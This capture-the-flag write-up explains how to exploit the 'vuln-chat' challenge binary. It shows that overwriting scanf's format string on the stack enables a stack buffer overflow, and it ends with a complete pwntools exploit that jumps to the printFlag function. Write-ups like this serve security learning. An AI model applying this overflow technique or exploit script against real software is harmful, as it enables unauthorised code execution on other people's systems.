# vuln chat

Let's take a look at the binary:

```
$	file vuln-chat 
vuln-chat: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a3caa1805eeeee1454ee76287be398b12b5fa2b7, not stripped
$	pwn checksec vuln-chat 
[*] '/Hackery/tuctf/vuln_chat/vuln-chat'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

So we can see it is a 32 bit binary, with a Non Executable stack. Let's see what happenes when we run it:

```
$	./vuln-chat 
----------- Welcome to vuln-chat -------------
Enter your username: guyinatuxedo
Welcome guyinatuxedo!
Connecting to 'djinn'
--- 'djinn' has joined your chat ---
djinn: I have the information. But how do I know I can trust you?
guyinatuxedo: You can't
djinn: Sorry. That's not good enough
```

So it prompts us for a username, and a reason to trust us. Let's take a look at the binary in IDA.

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char reason[20]; // [sp+3h] [bp-2Dh]@1
  char username[20]; // [sp+17h] [bp-19h]@1
  int scanf_argument; // [sp+2Bh] [bp-5h]@1
  char zero; // [sp+2Fh] [bp-1h]@1

  setvbuf(stdout, 0, 2, 0x14u);
  puts("----------- Welcome to vuln-chat -------------");
  printf("Enter your username: ");
  scanf_argument = 's03%';
  zero = 0;
  __isoc99_scanf(&scanf_argument, username);
  printf("Welcome %s!\n", username);
  puts("Connecting to 'djinn'");
  sleep(1u);
  puts("--- 'djinn' has joined your chat ---");
  puts("djinn: I have the information. But how do I know I can trust you?");
  printf("%s: ", username);
  __isoc99_scanf(&scanf_argument, reason);
  puts("djinn: Sorry. That's not good enough");
  fflush(stdout);
  return 0;
}
```

So we can see that it scans in our input using scanf, with the argument `%30s` being stored on the stack. Let's take a look at the stack to see the size of everything on the stack:

```
-0000002D reason          db 20 dup(?)
-00000019 username        db 20 dup(?)
-00000005 scanf_argument  dd ?
-00000001 zero            db ?
+00000000  s              db 4 dup(?)
+00000004  r              db 4 dup(?)
``` 

So we can see that our username has a size of `0x14`.  After that is the scanf argument on the stack, which is four bytes big. Since we can only write 30 bytes to username and reason, we can't reach the return address with that. However with the write to username, we can overwrite `scanf_argument` to something such as `%99s`, so with the write to `reason` we can write 99 bytes and overwrite the return address and get rce.

With rce, we see that there is a function called `printFlag`. Looking at it, we can see that it just runs cat on the flag. So with rce, we can just call this function and we should get the flag. We can find the address to it using objdump:

```
$	objdump -D vuln-chat | grep printFlag
0804856b <printFlag>:
```

So we can see the address to `printFlag` is `0x804856b`. The offset between `reason` and the return address is:

```
>>> hex(0x4 - -0x2d)
'0x31'
```

When we overwrite the scanf argument by just writing the four character string as hex.

With this, we can write the exploit:

```
#Import pwntools
from pwn import *

#Designate the target
target = process('./vuln-chat')
gdb.attach(target)
#target = remote('vulnchat.tuctf.com', 4141)

#Prompt for input for a pause
raw_input()

#Construct the first payload
payload0 = "0"*0x14 + p32(0x73393925)

#Print the text up to the prompt for the username
print target.recvuntil("Enter your username: ")

#Send the first payload to overwrite the scanf argument
target.sendline(payload0)

#Construct the second payload
payload1 = "0"*0x31 + p32(0x804856b)

#Send the second payload
target.sendline(payload1)

#Drop to an interactive shell
target.interactive()
```

and when we run it, we get the flag `TUCTF{574ck_5m45h1n6_l1k3_4_pr0}`.

Just like that, we captured the flag!
